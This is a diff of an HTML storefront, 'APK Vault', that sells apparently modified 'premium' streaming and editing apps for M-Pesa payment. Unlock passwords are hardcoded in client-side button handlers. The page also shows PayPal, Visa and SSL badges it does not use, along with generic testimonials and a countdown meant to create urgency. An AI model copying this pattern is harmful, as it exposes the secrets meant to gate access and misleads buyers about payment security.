+                                <iframe width="560" height="315" src="https://www.youtube.com/embed/NiO0FwlvwZ0?si=qAlG95axxcAuDsae" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen loading="lazy"></iframe>
+                            </div>
+                            <div class="testimonials">
+                                <h4>What Users Are Saying:</h4>
+                                <p>"Ad-free YouTube is a game changer! The offline feature is amazing too." — Lisa F.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- App 8 -->
+                    <div class="app-item">
+                        <h3>App 8: Startimes VIP On</h3>
+                        <div class="app-info">
+                            <img src="IMAGES/StartimesVIPOn.jpg" alt="Startimes VIP On app image" class="app-image" loading="lazy">
+                            <div class="badges">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo" loading="lazy">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo" loading="lazy">
+                            </div>
+                        </div>
+                        <p>Access exclusive movies, sports, and on-demand content in HD with StarTimes VIP On streaming.</p>
+                        <p class="price">Ksh 280</p>
+                        
+                        <div class="button-container">
+                            <button class="cta-button" onclick="openRequestForm('Startimes On', 'StartPASSWORD456', 'Startimes_On.apk')">Buy Now</button>
+                            <button class="expand-btn" onclick="toggleDemo('demo8')">Show Demo</button>
+                        </div>
+
+                        <div id="demo8" class="demo-content" style="display: none;">
+                            <div class="video-container">
+                                <iframe width="560" height="315" src="https://www.youtube.com/embed/8QZwEaRbv9Y?si=zwE94uW1KxUWOWK-" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen loading="lazy"></iframe>
+                            </div>
+                            <div class="testimonials">
+                                <h4>What Users Are Saying:</h4>
+                                <p>"StarTimes VIP On has great content, especially for sports lovers. HD quality streaming is perfect!" — John K.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- App 9 -->
+                    <div class="app-item">
+                        <h3>App 9: Audiomark</h3>
+                        <div class="app-info">
+                            <img src="IMAGES/Audiomark.jpg" alt="Audiomark app image" class="app-image" loading="lazy">
+                            <div class="badges">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo" loading="lazy">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo" loading="lazy">
+                            </div>
+                        </div>
+                        <p>Enjoy unlimited music streaming with Audiomark, offering a wide variety of local and international music content.</p>
+                        <p class="price">Ksh 250</p>
+                        
+                        <div class="button-container">
+                            <button class="cta-button" onclick="openRequestForm('Audiomark', 'AudiomarkPassword123', 'Audiomark.apk')">Buy Now</button>
+                            <button class="expand-btn" onclick="toggleDemo('demo9')">Show Demo</button>
+                        </div>
+
+                        <div id="demo9" class="demo-content" style="display: none;">
+                            <div class="video-container">
+                                <iframe width="560" height="315" src="https://www.youtube.com/embed/LRg1vBu_Wzo?si=gNkzTNZhSHzD8-8Z" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen loading="lazy"></iframe>
+                            </div>
+                            <div class="testimonials">
+                                <h4>What Users Are Saying:</h4>
+                                <p>"Audiomark is my go-to app for music streaming. The variety of local and international content is unmatched!" — Kevin L.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- App 10 -->
+                    <div class="app-item">
+                        <h3>App 10: InShot</h3>
+                        <div class="app-info">
+                            <img src="IMAGES/InShot.jpg" alt="InShot app image" class="app-image" loading="lazy">
+                            <div class="badges">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo" loading="lazy">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo" loading="lazy">
+                            </div>
+                        </div>
+                        <p>InShot is the perfect app for editing videos and photos with various effects, filters, and more for social media sharing.</p>
+                        <p class="price">Ksh 200</p>
+                        
+                        <div class="button-container">
+                            <button class="cta-button" onclick="openRequestForm('InShot', 'InShotPassword123', 'InShot.apk')">Buy Now</button>
+                            <button class="expand-btn" onclick="toggleDemo('demo10')">Show Demo</button>
+                        </div>
+
+                        <div id="demo10" class="demo-content" style="display: none;">
+                            <div class="video-container">
+                                <iframe width="560" height="315" src="https://www.youtube.com/embed/5zuzpL1ZC38?si=rXxN-Owap7Wve1oq" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen loading="lazy"></iframe>
+                            </div>
+                            <div class="testimonials">
+                                <h4>What Users Are Saying:</h4>
+                                <p>"InShot has all the tools I need for video and photo editing. Perfect for quick edits before sharing on social media!" — Rachel J.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    background-color: #f5f5f5;
+                    margin: 0;
+                    padding: 0;
+                    transition: background-color 0.5s, color 0.5s;
+                }
+                body.dark-mode {
+                    background-color: #121212;
+                    color: #f5f5f5;
+                }
+                .container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #333;
+                    color: white;
+                    padding: 20px 0;
+                    text-align: center;
+                    border-radius: 8px;
+                    margin-bottom: 30px;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                }
+                header h1 {
+                    font-size: 2.5rem;
+                    margin: 0;
+                }
+                .app-list {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+                    gap: 25px;
+                    padding: 20px;
+                }
+                .app-item {
+                    background-color: #fff;
+                    padding: 20px;
+                    border-radius: 12px;
+                    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+                    text-align: center;
+                    transition: all 0.3s ease;
+                    border: 1px solid #e0e0e0;
+                }
+                .app-item:hover {
+                    transform: translateY(-5px);
+                    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.15);
+                }
+                .app-item h3 {
+                    font-size: 1.3rem;
+                    margin-top: 0;
+                    color: #333;
+                }
+                body.dark-mode .app-item h3,
+                body.dark-mode .app-item p {
+                    color: #f5f5f5;
+                }
+                body.dark-mode .app-item {
+                    background-color: #1e1e1e;
+                    border-color: #333;
+                }
+                .price {
+                    font-size: 1.5rem;
+                    color: #007bff;
+                    font-weight: bold;
+                    margin: 15px 0;
+                }
+                .cta-button {
+                    background-color: #007bff;
+                    color: white;
+                    border: none;
+                    padding: 12px 25px;
+                    cursor: pointer;
+                    border-radius: 6px;
+                    font-size: 1rem;
+                    font-weight: bold;
+                    transition: all 0.3s ease;
+                    width: 100%;
+                    margin: 10px 0;
+                }
+                .cta-button:hover {
+                    background-color: #0056b3;
+                    transform: translateY(-2px);
+                }
+                .expand-button, .expand-btn {
+                    background-color: #6c757d;
+                    color: white;
+                    border: none;
+                    padding: 10px 20px;
+                    cursor: pointer;
+                    border-radius: 6px;
+                    font-size: 0.9rem;
+                    transition: all 0.3s ease;
+                    width: 100%;
+                }
+                .expand-button:hover, .expand-btn:hover {
+                    background-color: #5a6268;
+                    transform: translateY(-2px);
+                }
+                .button-container {
+                    display: flex;
+                    gap: 10px;
+                    margin-top: 15px;
+                }
+                .button-container .cta-button,
+                .button-container .expand-btn {
+                    flex: 1;
+                }
+                .app-info {
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                    margin-bottom: 15px;
+                }
+                .app-image {
+                    width: 100%;
+                    max-width: 200px;
+                    height: auto;
+                    border-radius: 8px;
+                    margin: 0 auto;
+                    display: block;
+                }
+                .badges {
+                    display: flex;
+                    gap: 10px;
+                    justify-content: center;
+                    margin-top: 10px;
+                }
+                .payment-logo, .ssl-logo {
+                    width: 40px;
+                    height: auto;
+                }
+                .app-demo, .demo-content {
+                    margin-top: 20px;
+                    padding-top: 20px;
+                    border-top: 1px solid #eee;
+                }
+                body.dark-mode .app-demo,
+                body.dark-mode .demo-content {
+                    border-top-color: #333;
+                }
+                .testimonials {
+                    background-color: #f8f9fa;
+                    padding: 15px;
+                    border-radius: 8px;
+                    margin-top: 15px;
+                    text-align: left;
+                }
+                body.dark-mode .testimonials {
+                    background-color: #2a2a2a;
+                }
+                .testimonials h4 {
+                    margin-top: 0;
+                    color: #007bff;
+                }
+                .video-container {
+                    position: relative;
+                    padding-bottom: 56.25%;
+                    height: 0;
+                    overflow: hidden;
+                    margin-bottom: 15px;
+                    border-radius: 8px;
+                }
+                .video-container iframe {
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    border: none;
+                }
+                
+                /* Responsive adjustments */
+                @media (max-width: 992px) {
+                    .app-list {
+                        grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+                    }
+                }
+                @media (max-width: 768px) {
+                    header h1 {
+                        font-size: 2rem;
+                    }
+                    .app-list {
+                        grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+                        gap: 20px;
+                        padding: 15px;
+                    }
+                    .app-item {
+                        padding: 15px;
+                    }
+                }
+                @media (max-width: 576px) {
+                    .app-list {
+                        grid-template-columns: 1fr;
+                    }
+                    .button-container {
+                        flex-direction: column;
+                    }
+                }
+            </style>
+
+            <section id="request-form">
+                <div class="form-container" id="form-container" style="display:none;">
+                    <h3>Request Your App</h3>
+                    <form id="request-form" onsubmit="submitForm(event)">
+                        <label for="name">Your Name:</label>
+                        <input type="text" id="name" name="name" placeholder="Full Name (optional)" required>
+
+                        <label for="email">Your Email:</label>
+                        <input type="email" id="email" name="email" placeholder="Active Email" required>
+
+                        <label for="appname">App Name:</label>
+                        <input type="text" id="appname" name="appname" readonly required>
+
+                        <label for="description">Mpesa message:</label>
+                        <textarea id="description" name="description" rows="5" placeholder="Pochi:0701211452" required></textarea>
+
+                        <h3>How would you like to receive the password?</h3>
+                        <div class="radio-group">
+                            <label for="password-method-email">
+                                <input type="radio" id="password-method-email" name="password-method" value="email" required> Email
+                            </label>
+                            <label for="password-method-whatsapp">
+                                <input type="radio" id="password-method-whatsapp" name="password-method" value="whatsapp" required> WhatsApp
+                            </label>
+                            <label for="password-method-sms">
+                                <input type="radio" id="password-method-sms" name="password-method" value="sms" required> SMS
+                            </label>
+                        </div>
+
+                        <button type="submit" class="submit-btn">Submit Request</button>
+                    </form>
+                    
+                    <div id="form-response" style="display:none;"></div>
+                </div>
+            </section>
+
+            <style>
+                .form-container {
+                    max-width: 600px;
+                    margin: 30px auto;
+                    padding: 25px;
+                    background: #fff;
+                    border-radius: 12px;
+                    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+                }
+                body.dark-mode .form-container {
+                    background: #1e1e1e;
+                }
+                .form-container h3 {
+                    margin-top: 0;
+                    text-align: center;
+                    color: #333;
+                }
+                body.dark-mode .form-container h3 {
+                    color: #f5f5f5;
+                }
+                label {
+                    display: block;
+                    margin: 15px 0 5px;
+                    font-weight: bold;
+                    color: #555;
+                }
+                body.dark-mode label {
+                    color: #ccc;
+                }
+                input[type="text"],
+                input[type="email"],
+                textarea {
+                    width: 100%;
+                    padding: 12px;
+                    border: 1px solid #ddd;
+                    border-radius: 6px;
+                    font-size: 16px;
+                    box-sizing: border-box;
+                }
+                body.dark-mode input[type="text"],
+                body.dark-mode input[type="email"],
+                body.dark-mode textarea {
+                    background: #2a2a2a;
+                    border-color: #444;
+                    color: #f5f5f5;
+                }
+                textarea {
+                    resize: vertical;
+                    min-height: 100px;
+                }
+                .radio-group {
+                    display: flex;
+                    flex-direction: column;
+                    gap: 10px;
+                    margin: 15px 0;
+                }
+                .radio-group label {
+                    display: flex;
+                    align-items: center;
+                    gap: 8px;
+                    font-weight: normal;
+                    cursor: pointer;
+                }
+                .submit-btn {
+                    width: 100%;
+                    padding: 14px;
+                    background-color: #28a745;
+                    color: white;
+                    border: none;
+                    border-radius: 6px;
+                    font-size: 16px;
+                    font-weight: bold;
+                    cursor: pointer;
+                    transition: all 0.3s ease;
+                    margin-top: 15px;
+                }
+                .submit-btn:hover {
+                    background-color: #218838;
+                    transform: translateY(-2px);
+                }
+            </style>
+
+            <section id="vault" class="vault-container">
+                <h3>Enter the Password to Access the APK Vault</h3>
+                <input type="password" id="vault-password" placeholder="Enter Password">
+                <button onclick="checkPassword()">Access Vault</button>
+
+                <div id="download-link" style="display: none;">
+                    <p>Your APK download link: <a href="#" id="apk-link" target="_blank">Download APK</a></p>
+                </div>
+
+                <div id="password-message" style="display: none;">
+                    <p>The password will be sent to your selected method (Email, WhatsApp, or SMS) within 10 minutes after payment verification.</p>
+                </div>
+            </section>
+
+            <style>
+                .vault-container {
+                    max-width: 500px;
+                    margin: 40px auto;
+                    padding: 25px;
+                    background: #fff;
+                    border-radius: 12px;
+                    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+                    text-align: center;
+                }
+                body.dark-mode .vault-container {
+                    background: #1e1e1e;
+                }
+                .vault-container h3 {
+                    margin-top: 0;
+                    color: #333;
+                }
+                body.dark-mode .vault-container h3 {
+                    color: #f5f5f5;
+                }
+                .vault-container input {
+                    width: 100%;
+                    padding: 12px;
+                    margin: 15px 0;
+                    border: 1px solid #ddd;
+                    border-radius: 6px;
+                    font-size: 16px;
+                }
+                body.dark-mode .vault-container input {
+                    background: #2a2a2a;
+                    border-color: #444;
+                    color: #f5f5f5;
+                }
+                .vault-container button {
+                    padding: 12px 25px;
+                    background-color: #007bff;
+                    color: white;
+                    border: none;
+                    border-radius: 6px;
+                    font-size: 16px;
+                    cursor: pointer;
+                    transition: all 0.3s ease;
+                }
+                .vault-container button:hover {
+                    background-color: #0056b3;
+                    transform: translateY(-2px);
+                }
+                #download-link {
+                    margin-top: 20px;
+                }
+                #download-link a {
+                    color: #007bff;
+                    text-decoration: none;
+                    font-weight: bold;
+                }
+                #download-link a:hover {
+                    text-decoration: underline;
+                }
+                #password-message {
+                    margin-top: 20px;
+                    padding: 15px;
+                    background: #f8f9fa;
+                    border-radius: 8px;
+                }
+                body.dark-mode #password-message {
+                    background: #2a2a2a;
+                }
+            </style>
+
+            <!-- Security & FAQ Section -->
+            <div class="section">
+                <h2>🔒 Secure Payments</h2>
+                <p>We use <strong>SSL encryption</strong> to keep your transactions safe.</p>
+                <p>Your payment details are <strong>100% secure</strong> and never stored.</p>
+                <div class="badges">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" loading="lazy">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" loading="lazy">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="MasterCard" loading="lazy">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/39/Secure_Payment.png" alt="Secure Checkout" loading="lazy">
+                </div>
+            </div>
+            
+            <div class="section">
+                <h2>❓ Frequently Asked Questions</h2>
+                <div class="faq-item" onclick="toggleFAQ(0)">
+                    <strong>📥 How do I download my purchased app?</strong>
+                    <div class="faq-answer">After purchase, you will receive a download link via email.</div>
+                </div>
+                <div class="faq-item" onclick="toggleFAQ(1)">
+                    <strong>📌 Do I get lifetime updates?</strong>
+                    <div class="faq-answer">Yes! You get free updates for all purchased apps.</div>
+                </div>
+                <div class="faq-item" onclick="toggleFAQ(2)">
+                    <strong>💰 What is the refund policy?</strong>
+                    <div class="faq-answer">We offer a 7-day money-back guarantee if you're not satisfied.</div>
+                </div>
+            </div>
+
+            <style>
+                .section {
+                    width: 90%;
+                    max-width: 800px;
+                    margin: 40px auto;
+                    padding: 25px;
+                    border-radius: 12px;
+                    background: #fff;
+                    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+                    text-align: center;
+                }
+                body.dark-mode .section {
+                    background: #1e1e1e;
+                }
+                .section h2 {
+                    margin-top: 0;
+                    color: #333;
+                }
+                body.dark-mode .section h2 {
+                    color: #f5f5f5;
+                }
+                .section p {
+                    color: #555;
+                    line-height: 1.6;
+                }
+                body.dark-mode .section p {
+                    color: #ccc;
+                }
+                .badges {
+                    display: flex;
+                    justify-content: center;
+                    flex-wrap: wrap;
+                    gap: 15px;
+                    margin-top: 20px;
+                }
+                .badges img {
+                    width: 80px;
+                    height: auto;
+                    object-fit: contain;
+                }
+                .faq-item {
+                    border-bottom: 1px solid #eee;
+                    padding: 15px;
+                    cursor: pointer;
+                    text-align: left;
+                    transition: background-color 0.2s;
+                }
+                body.dark-mode .faq-item {
+                    border-bottom-color: #333;
+                }
+                .faq-item:hover {
+                    background-color: #f8f9fa;
+                }
+                body.dark-mode .faq-item:hover {
+                    background-color: #2a2a2a;
+                }
+                .faq-item:last-child {
+                    border-bottom: none;
+                }
+                .faq-answer {
+                    display: none;
+                    padding: 10px;
+                    color: #555;
+                    background: #f8f9fa;
+                    margin-top: 10px;
+                    border-radius: 6px;
+                    line-height: 1.6;
+                }
+                body.dark-mode .faq-answer {
+                    color: #ccc;
+                    background: #2a2a2a;
+                }
+            </style>
+
+            <!-- Privacy Policy Accordion -->
+            <div class="accordion">
+                <div class="accordion-header" id="privacyToggle">
+                    Privacy Policy
+                    <span class="arrow">▼</span>
+                </div>
+                <div class="accordion-content" id="privacyContent">
+                    <p>Your privacy is important to us. We collect minimal data required for transactions and do not share your information with third parties.</p>
+                    <p>By using our services, you agree to our data collection practices, which include order details and customer support interactions.</p>
+                    <p>For more details, visit our <a href="/terms">Terms & Conditions</a>.</p>
+                </div>
+            </div>
+
+            <style>
+                .accordion {
+                    width: 90%;
+                    max-width: 800px;
+                    margin: 40px auto;
+                    border: 1px solid #ddd;
+                    border-radius: 12px;
+                    overflow: hidden;
+                    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+                }
+                body.dark-mode .accordion {
+                    border-color: #444;
+                }
+                .accordion-header {
+                    background: #007BFF;
+                    color: white;
+                    padding: 18px;
+                    cursor: pointer;
+                    text-align: left;
+                    font-size: 18px;
+                    display: flex;
+                    justify-content: space-between;
+                    align-items: center;
+                    transition: background-color 0.2s;
+                }
+                .accordion-header:hover {
+                    background: #0069d9;
+                }
+                .accordion-content {
+                    display: none;
+                    padding: 20px;
+                    background: #f8f9fa;
+                    text-align: left;
+                    border-top: 1px solid #ddd;
+                    line-height: 1.6;
+                }
+                body.dark-mode .accordion-content {
+                    background: #2a2a2a;
+                    border-top-color: #444;
+                    color: #f5f5f5;
+                }
+                .accordion-content a {
+                    color: #007BFF;
+                    text-decoration: none;
+                }
+                .accordion-content a:hover {
+                    text-decoration: underline;
+                }
+                .arrow {
+                    transition: transform 0.3s;
+                    font-size: 14px;
+                }
+                .arrow.rotate {
+                    transform: rotate(180deg);
+                }
+            </style>
+
+            <!-- Countdown Message for Time-Based Discount -->
+            <div id="countdown" style="display: none;">
+                <p>Hurry up! Get 20% off your next purchase! Offer ends in <span id="time"></span></p>
+            </div>
+
+            <style>
+                #countdown {
+                    background: #ff9800;
+                    color: white;
+                    padding: 15px;
+                    text-align: center;
+                    border-radius: 8px;
+                    margin: 30px auto;
+                    max-width: 600px;
+                    font-weight: bold;
+                    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+                    animation: pulse 2s infinite;
+                }
+                @keyframes pulse {
+                    0% { transform: scale(1); }
+                    50% { transform: scale(1.02); }
+                    100% { transform: scale(1); }
+                }
+                #countdown p {
+                    margin: 0;
+                }
+                #time {
+                    font-size: 1.2em;
+                }
+            </style>
+
+            <footer class="footer">
+                <p>&copy; 2024 APK Vault. All rights reserved.</p>
+                <p>Send payment to MPesa number: <strong>0701211452</strong></p>
+            </footer>
+
+            <style>
+                .footer {
+                    text-align: center;
+                    padding: 25px;
+                    background-color: #333;
+                    color: white;
+                    margin-top: 50px;
+                    border-radius: 8px 8px 0 0;
+                }
+                .footer p {
+                    margin: 10px 0;
+                }
+                .footer strong {
+                    color: #ff9800;
+                }
+            </style>
+        </div>
+    </main>
+
+    <!-- Snapchat Gold Ad Modal -->
+    <div id="adModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeAd()">&times;</span>
+            <div class="description">Download the Free Snapchat Gold App now!</div>
+            <p>Available for download at 2:59 AM EAT.</p>
+
+            <!-- YouTube Video Embed -->
+            <div class="video-container">
+                <iframe width="100%" height="200" src="https://www.youtube.com/embed/y8F_ouXuR2A" frameborder="0" allow="autoplay; encrypted-media; picture-in-picture" allowfullscreen loading="lazy"></iframe>
+            </div>
+            <a id="downloadBtn" class="download-button" href="#" onclick="checkDownload(event)">Download Now</a>
+
+            <!-- Timer Display -->
+            <div class="timer" id="countdown"></div>
         </div>
     </div>
-    <p>Organize your tasks and improve productivity with an intuitive and easy-to-use task manager.</p>
-    <p class="price">Ksh 150</p>
-    <button class="cta-button" onclick="openRequestForm('Task Manager', 'PASSWORD123', 'task_manager.apk')">Buy Now</button>
 
-    <button class="expand-button" onclick="toggleDemo('demo-task-manager')">Show Demo</button>
-    <div id="demo-task-manager" class="app-demo" style="display: none;">
-        <h4>App Demonstration</h4>
-       <style>
-    .video-container {
-        position: relative;
-        padding-bottom: 56.25%; /* 16:9 aspect ratio */
-        height: 0;
-        overflow: hidden;
-        max-width: 100%;
-    }
-    .video-container iframe {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-    }
-</style>
-
-<div class="video-container">
-    <iframe width="560" height="315" src="https://www.youtube.com/embed/t0-rGmd7G6A?si=Rg0AtumGllQJsj93" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-</div>
-
-        <div class="testimonials">
-            <h4>What Users Are Saying:</h4>
-            <p>"This app completely changed the way I organize my tasks. It's super simple and keeps me on track!" — John D.</p>
-        </div>
-    </div>
-</div>
-
-<!-- App 2 -->
-<div class="app-item">
-    <h3>App 2: Fitness Tracker</h3>
-    <div class="app-info">
-        <img src="IMAGES/FitnessTracker.jpg" alt="Fitness Tracker app image" class="app-image">
-        <div class="badges">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo">
-        </div>
-    </div>
-    <p>Track your workouts and health progress with personalized goals and insights.</p>
-    <p class="price">Ksh 200</p>
-    <button class="cta-button" onclick="openRequestForm('Fitness Tracker', 'PASSWORD456', 'fitness_tracker.apk')">Buy Now</button>
-
-    <button class="expand-button" onclick="toggleDemo('demo-fitness-tracker')">Show Demo</button>
-    <div id="demo-fitness-tracker" class="app-demo" style="display: none;">
-        <h4>App Demonstration</h4>
-        <style>
-    .video-container {
-        position: relative;
-        padding-bottom: 56.25%; /* 16:9 aspect ratio */
-        height: 0;
-        overflow: hidden;
-        max-width: 100%;
-    }
-    .video-container iframe {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-    }
-</style>
-
-<div class="video-container">
-    <iframe width="560" height="315" src="https://www.youtube.com/embed/JddrzXA08-U?si=Ov5zOe0GrouaRQbA" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-</div>
-        <div class="testimonials">
-            <h4>What Users Are Saying:</h4>
-            <p>"I love how it tracks my progress and motivates me to work out harder each day. Highly recommend!" — Sarah P.</p>
-        </div>
-    </div>
-</div>
-
-<!-- App 3 -->
-<div class="app-item">
-    <h3>App 3: Peacock Premium</h3>
-    <div class="app-info">
-        <img src="IMAGES/PeacockPremium.jpg" alt="Peacock Premium app image" class="app-image">
-        <div class="badges">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo">
-        </div>
-    </div>
-    <p>Stream your favorite shows, movies, and live sports ad-free with exclusive content from NBCUniversal.</p>
-    <p class="price">Ksh 250</p>
-    <button class="cta-button" onclick="openRequestForm('Peacock Premium', 'PEACOCK456', 'Peacock_Premium.apk')">Buy Now</button>
-
-    <button class="expand-button" onclick="toggleDemo('demo-peacock-premium')">Show Demo</button>
-    <div id="demo-peacock-premium" class="app-demo" style="display: none;">
-        <h4>App Demonstration</h4>
-        <style>
-    .video-container {
-        position: relative;
-        padding-bottom: 56.25%; /* 16:9 aspect ratio */
-        height: 0;
-        overflow: hidden;
-        max-width: 100%;
-    }
-    .video-container iframe {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-    }
-</style>
-
-<div class="video-container">
-   <iframe width="560" height="315" src="https://www.youtube.com/embed/xZ5J2E_43wY?si=594Sv4Fgr4h0l2EB" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-</div>
-        <div class="testimonials">
-            <h4>What Users Are Saying:</h4>
-            <p>"I never miss my favorite NBC shows! The stream quality is excellent, and the content selection is unbeatable!" — Mark S.</p>
-        </div>
-    </div>
-</div>
-
-<!-- App 4 -->
-<div class="app-item">
-    <h3>App 4: Netflix Premium</h3>
-    <div class="app-info">
-        <img src="IMAGES/NetflixPremium.jpg" alt="Netflix Premium app image" class="app-image">
-        <div class="badges">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo">
-        </div>
-    </div>
-    <p>Access Netflix's full library of movies, TV shows, and originals in 4K, ad-free, on up to 4 devices.</p>
-    <p class="price">Ksh 300</p>
-    <button class="cta-button" onclick="openRequestForm('Netflix Premium', 'PASSWORD0000456', 'Netflix_Premium.apk')">Buy Now</button>
-
-    <button class="expand-button" onclick="toggleDemo('demo-netflix-premium')">Show Demo</button>
-    <div id="demo-netflix-premium" class="app-demo" style="display: none;">
-        <h4>App Demonstration</h4>
-        <style>
-    .video-container {
-        position: relative;
-        padding-bottom: 56.25%; /* 16:9 aspect ratio */
-        height: 0;
-        overflow: hidden;
-        max-width: 100%;
-    }
-    .video-container iframe {
-        position: absolute;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-    }
-</style>
-
-<div class="video-container">
-    <iframe width="560" height="315" src="https://www.youtube.com/embed/C7oXIxZvUGQ?si=7dsXdKvVkIATw9g8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
-</div>
-        <div class="testimonials">
-            <h4>What Users Are Saying:</h4>
-            <p>"Best streaming experience ever! Netflix Premium lets me watch everything I love in 4K. Worth every penny!" — Jessica T.</p>
-        </div>
-    </div>
-</div>
-
-<style>
-    .app-info {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-    }
-
-    .app-image {
-        width: 100%;
-        max-width: 300px;
-        height: auto;
-    }
-
-    .payment-logo, .ssl-logo {
-        width: 40px;
-        margin: 5px;
-    }
-
-    .badges {
-        display: flex;
-        align-items: center;
-    }
-
-    .app-demo, .testimonials {
-        margin-top: 20px;
-        text-align: center;
-    }
-
-    .cta-button {
-        background-color: #4CAF50;
-        color: white;
-        padding: 10px 20px;
-        border: none;
-        cursor: pointer;
-        font-size: 16px;
-    }
-
-    .cta-button:hover {
-        background-color: #45a049;
-    }
-
-    .expand-button {
-        background-color: #2196F3;
-        color: white;
-        padding: 5px 15px;
-        border: none;
-        cursor: pointer;
-        font-size: 14px;
-        margin-top: 10px;
-    }
-
-    .expand-button:hover {
-        background-color: #0b7dda;
-    }
-</style>
-
-<script>
-    function toggleDemo(demoId) {
-        var demoSection = document.getElementById(demoId);
-        if (demoSection.style.display === "none" || demoSection.style.display === "") {
-            demoSection.style.display = "block";
-        } else {
-            demoSection.style.display = "none";
-        }
-    }
-</script>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat Gold Ad</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-        }
-
-        /* Modal Styling */
-        .modal {
-            display: none; /* Hidden by default */
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-        }
-
-        .modal-content {
-            background: white;
-            width: 90%;
+        /* Ad Modal Styling */
+        #adModal .modal-content {
             max-width: 500px;
